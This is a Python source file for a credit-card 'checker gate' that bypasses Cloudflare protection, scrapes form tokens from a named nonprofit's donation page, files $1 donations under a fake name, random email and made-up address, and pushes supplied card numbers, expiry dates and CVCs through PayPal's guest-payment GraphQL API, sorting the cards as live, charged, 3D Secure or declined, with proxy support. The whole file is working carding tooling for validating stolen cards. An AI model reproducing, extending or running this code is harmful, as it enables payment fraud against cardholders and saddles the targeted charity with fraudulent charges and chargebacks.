import cloudscraper
import requests
import json
import re
import random
import string
import asyncio
import uuid

def _generate_email():
    domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]
    name = ''.join(random.choices(string.ascii_lowercase, k=10))
    return f"{name}@{random.choice(domains)}"

def check_card_paypal_aww_sync(cc, mm, yy, cvc, proxy_url=None):
    """
    Synchronous PayPal Commerce $1.00 Gate (awwatersheds.org) with Cloudflare Bypass.
    Flow:
    1. GET /donate/ (extract form hash via cloudscraper)
    2. POST /wp-admin/admin-ajax.php (action=give_process_donation)
    3. POST /wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order
    4. POST https://www.paypal.com/graphql?paywithcard (mutation approveGuestPaymentWithCreditCard)
    Returns: (status, message, brand)
    """
    if len(yy) == 2:
        exp_year = f"20{yy}"
    else:
        exp_year = yy
    exp_formatted = f"{mm.zfill(2)}/{exp_year}"

    s = cloudscraper.create_scraper(
        browser={'browser': 'chrome', 'platform': 'windows', 'mobile': False}
    )
    s.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
    })

    if proxy_url:
        s.proxies = {'http': proxy_url, 'https': proxy_url}

    try:
        # Step 1: GET donation page to extract form hash
        r_page = s.get('https://awwatersheds.org/donate/', timeout=15)
        if r_page.status_code != 200:
            return "declined", f"Failed to reach donation page ({r_page.status_code})", "N/A"
        hash_match = re.search(r'name="give-form-hash".*?value="([^"]+)"', r_page.text)
        form_hash = hash_match.group(1) if hash_match else '0157d4db02'

        form_prefix_match = re.search(r'name="give-form-id-prefix".*?value="([^"]+)"', r_page.text)
        form_prefix = form_prefix_match.group(1) if form_prefix_match else '4572-1'

        form_id_match = re.search(r'name="give-form-id".*?value="([^"]+)"', r_page.text)
        form_id = form_id_match.group(1) if form_id_match else '4572'

        email = _generate_email()
        first_name = "Tommy"
        last_name = "Walid"

        # Step 2: Initialize donation session
        headers_ajax = {
            'Origin': 'https://awwatersheds.org',
            'Referer': 'https://awwatersheds.org/donate/',
        }
        files_init = {
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, form_prefix),
            'give-form-id': (None, form_id),
            'give-form-title': (None, 'Donate Now'),
            'give-current-url': (None, 'https://awwatersheds.org/donate/'),
            'give-form-url': (None, 'https://awwatersheds.org/donate/'),
            'give-form-minimum': (None, '1'),
            'give-form-maximum': (None, '1000000'),
            'give-form-hash': (None, form_hash),
            'give-price-id': (None, 'custom'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            'give_recurring_donation_details': (None, '{"is_recurring":false}'),
            'give-amount': (None, '1'),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, first_name),
            'give_last': (None, last_name),
            'give_email': (None, email),
            'give_comment': (None, ''),
            'give_lake_affiliation': (None, 'Lovell Lake'),
            'give_lake_affiliation_other': (None, ''),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give_action': (None, 'purchase'),
            'give-gateway': (None, 'paypal-commerce'),
            'action': (None, 'give_process_donation'),
            'give_ajax': (None, 'true'),
        }

        r_proc = s.post('https://awwatersheds.org/wp-admin/admin-ajax.php', headers=headers_ajax, files=files_init, timeout=15)

        # Step 3: Create PayPal Commerce Order
        params_order = {'action': 'give_paypal_commerce_create_order'}
        files_order = {
            'give-honeypot': (None, ''),
            'give-form-id-prefix': (None, form_prefix),
            'give-form-id': (None, form_id),
            'give-form-title': (None, 'Donate Now'),
            'give-current-url': (None, 'https://awwatersheds.org/donate/'),
            'give-form-url': (None, 'https://awwatersheds.org/donate/'),
            'give-form-minimum': (None, '1'),
            'give-form-maximum': (None, '1000000'),
            'give-form-hash': (None, form_hash),
            'give-price-id': (None, 'custom'),
            'give-recurring-logged-in-only': (None, ''),
            'give-logged-in-only': (None, '1'),
            'give_recurring_donation_details': (None, '{"is_recurring":false}'),
            'give-amount': (None, '1'),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, first_name),
            'give_last': (None, last_name),
            'give_email': (None, email),
            'give_comment': (None, ''),
            'give_lake_affiliation': (None, 'Lovell Lake'),
            'give_lake_affiliation_other': (None, ''),
            'card_exp_month': (None, ''),
            'card_exp_year': (None, ''),
            'give-gateway': (None, 'paypal-commerce'),
        }

        r_order = s.post('https://awwatersheds.org/wp-admin/admin-ajax.php', params=params_order, headers=headers_ajax, files=files_order, timeout=15)

        order_id = None
        try:
            order_json = r_order.json()
            order_id = order_json.get('data', {}).get('id') or order_json.get('id')
        except Exception:
            pass

        if not order_id:
            order_match = re.search(r'([A-Z0-9]{17})', r_order.text)
            if order_match:
                order_id = order_match.group(1)
            else:
                return "declined", f"Failed to create PayPal Order ID ({r_order.status_code})", "N/A"

        # Step 4: Pay with card via PayPal GraphQL
        fraudnet_session_id = uuid.uuid4().hex
        headers_paypal = {
            'Accept': '*/*',
            'Content-Type': 'application/json',
            'Origin': 'https://www.paypal.com',
            'Referer': 'https://www.paypal.com/smart/card-fields',
            'paypal-client-context': order_id,
            'paypal-client-metadata-id': fraudnet_session_id,
            'x-requested-with': 'XMLHttpRequest',
            'x-app-name': 'standardcardfields',
            'x-country': 'US',
        }

        graphql_payload = {
            'query': '''
                mutation payWithCard(
                    $token: String!
                    $card: CardInput
                    $paymentToken: String
                    $phoneNumber: String
                    $firstName: String
                    $lastName: String
                    $shippingAddress: AddressInput
                    $billingAddress: AddressInput
                    $email: String
                    $currencyConversionType: CheckoutCurrencyConversionType
                    $installmentTerm: Int
                    $identityDocument: IdentityDocumentInput
                    $feeReferenceId: String
                ) {
                    approveGuestPaymentWithCreditCard(
                        token: $token
                        card: $card
                        paymentToken: $paymentToken
                        phoneNumber: $phoneNumber
                        firstName: $firstName
                        lastName: $lastName
                        email: $email
                        shippingAddress: $shippingAddress
                        billingAddress: $billingAddress
                        currencyConversionType: $currencyConversionType
                        installmentTerm: $installmentTerm
                        identityDocument: $identityDocument
                        feeReferenceId: $feeReferenceId
                    ) {
                        flags {
                            is3DSecureRequired
                        }
                        cart {
                            intent
                            cartId
                            buyer {
                                userId
                                auth {
                                    accessToken
                                }
                            }
                            returnUrl {
                                href
                            }
                        }
                        paymentContingencies {
                            threeDomainSecure {
                                status
                                method
                                redirectUrl {
                                    href
                                }
                                parameter
                            }
                        }
                    }
                }
            ''',
            'variables': {
                'token': order_id,
                'card': {
                    'cardNumber': cc,
                    'expirationDate': exp_formatted,
                    'postalCode': '10001',
                    'securityCode': cvc,
                },
                'phoneNumber': '3154962318',
                'firstName': first_name,
                'lastName': last_name,
                'billingAddress': {
                    'givenName': first_name,
                    'familyName': last_name,
                    'line1': '100 Main St',
                    'line2': None,
                    'city': 'New York',
                    'state': 'NY',
                    'postalCode': '10001',
                    'country': 'US',
                },
                'shippingAddress': {
                    'givenName': first_name,
                    'familyName': last_name,
                    'line1': '100 Main St',
                    'line2': None,
                    'city': 'New York',
                    'state': 'NY',
                    'postalCode': '10001',
                    'country': 'US',
                },
                'email': email,
                'currencyConversionType': 'PAYPAL',
            },
            'operationName': 'payWithCard',
        }

        r_pay = s.post('https://www.paypal.com/graphql?paywithcard', headers=headers_paypal, json=graphql_payload, timeout=20)
        pay_res = r_pay.json()

        # Parse GraphQL response
        if 'errors' in pay_res:
            err_msg = pay_res['errors'][0].get('message', 'PayPal Payment Error')
            err_lower = err_msg.lower()
            if "guest_payment_integrity_validation_failed" in err_lower:
                return "declined", "Declined (Security/Integrity Check Failed)", "N/A"
            elif "insufficient" in err_lower or "funds" in err_lower:
                return "live", "Insufficient Funds", "N/A"
            elif "cvv" in err_lower or "card code" in err_lower:
                return "live", "CVV Mismatch", "N/A"
            elif "3d" in err_lower or "verification" in err_lower:
                return "3ds", "3D Secure / Verification Required", "N/A"
            else:
                return "declined", err_msg, "N/A"

        data_guest = pay_res.get('data', {}).get('approveGuestPaymentWithCreditCard', {})
        flags = data_guest.get('flags', {})
        if flags.get('is3DSecureRequired'):
            return "3ds", "3D Secure / Verification Required", "N/A"

        contingencies = data_guest.get('paymentContingencies', {}).get('threeDomainSecure')
        if contingencies:
            return "3ds", "3D Secure / Verification Required", "N/A"

        if data_guest.get('cart'):
            return "charged", "Charge Successful ($1.00)", "N/A"

        return "declined", r_pay.text[:120], "N/A"

    except Exception as e:
        return "error", str(e), "N/A"

async def check_card_paypal_aww(cc, mm, yy, cvc, proxy_url=None):
    """
    Async wrapper for check_card_paypal_aww_sync.
    """
    return await asyncio.to_thread(check_card_paypal_aww_sync, cc, mm, yy, cvc, proxy_url=proxy_url)
